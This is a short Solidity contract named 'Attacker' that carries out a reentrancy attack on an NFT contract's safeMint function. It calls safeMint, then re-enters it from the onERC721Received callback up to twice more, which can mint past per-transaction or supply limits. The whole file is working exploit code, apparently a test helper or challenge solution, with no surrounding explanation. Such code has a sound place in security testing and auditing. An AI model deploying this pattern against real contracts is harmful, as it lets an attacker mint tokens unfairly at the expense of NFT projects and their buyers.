// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

interface ERC721A__IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

import "erc721a/contracts/IERC721A.sol";

contract Attacker is ERC721A__IERC721Receiver {
    address public nftContract;
    uint256 public counter;

    constructor(address _nftContract) {
        nftContract = _nftContract;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (counter <= 1) {
            counter++;
            (bool success, bytes memory data) = nftContract.call(
                abi.encodeWithSignature("safeMint(uint256)", 1)
            );
            if (!success) revert();
        }
        return this.onERC721Received.selector;
    }

    function initiate(uint256 _amount) public {
        (bool success, bytes memory data) = nftContract.call(
            abi.encodeWithSignature("safeMint(uint256)", _amount)
        );
        require(success, "Low-level call failed!");
        // counter++;
    }
}
